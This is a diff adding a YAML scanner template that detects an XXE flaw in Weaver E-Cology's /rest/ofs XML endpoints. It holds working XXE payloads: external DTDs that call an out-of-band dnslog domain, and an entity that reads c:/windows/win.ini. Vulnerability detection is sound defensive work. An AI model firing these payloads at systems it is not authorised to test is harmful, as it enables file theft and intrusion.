@@ -1,0 +1,38 @@
+name: 泛微E-Cology-rest/ofs接口XXE
+description: >
+  XXE漏洞，可进行带外请求、文件读取
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: POST
+    path: /rest/ofs/ReceiveCCRequestByXml
+    dnslog: domain
+    headers:
+      Content-Type: application/xml
+    body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{domain}}">
+        <M><syscode>&send;</syscode></M>
+    expression:
+      dnslogCheck: true
+  - method: POST
+    path: /rest/ofs/deleteUserRequestInfoByXml
+    dnslog: domain
+    headers:
+      Content-Type: application/xml
+    body: |
+        <?xml version="1.0" encoding="utf-8"?>
+        <!DOCTYPE syscode SYSTEM "http://{{domain}}">
+        <M><syscode>&send;</syscode></M>
+    expression:
+      dnslogCheck: true
+  - method: POST
+    path: /rest/ofs/ProcessOverRequestByXml
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="utf-8" ?><!DOCTYPE test[<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><reset><syscode>&test;</syscode></reset>
+    expression:
+      status: 200
+      body_all:
+        - "fonts"
